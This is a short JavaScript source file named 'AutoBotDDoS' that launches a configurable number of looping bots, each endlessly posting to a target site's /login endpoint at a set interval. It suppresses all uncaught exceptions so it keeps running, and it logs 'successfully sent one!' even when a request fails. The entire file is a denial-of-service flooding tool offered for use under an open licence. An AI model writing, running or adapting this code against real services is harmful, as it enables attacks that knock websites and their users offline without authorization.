// AutoBotDDoS (2024)
// Copyright (c) 2024 Rui Reogo
// Licensed under the MIT License

// anti death
process.on('uncaughtException', err => {});

// import necessary things
const config = require('./conf.json');
const utils = require('./utils');
const axios = require('axios');

const bot = async (botId) => {
  const {
    AUTOBOT_URL,
    TIME_INTERVAL
  } = config;
  const xurl = AUTOBOT_URL + "/login";

  while (true) {
    try {
      const state = utils.getState();
      axios.post(xurl, {
        state,
        commands: []
      });

      console.log(`Bot ${botId}: successfully sent one!`);
      await utils.sleep(TIME_INTERVAL);
    } catch {
      console.log(`Bot ${botId}: successfully sent one!`);
    };
  };
};

const run = () => {
  const { NUM_BOTS } = config;

  for (let i = 0; i < NUM_BOTS; i++) {
    bot(i + 1);
  };
};

run();
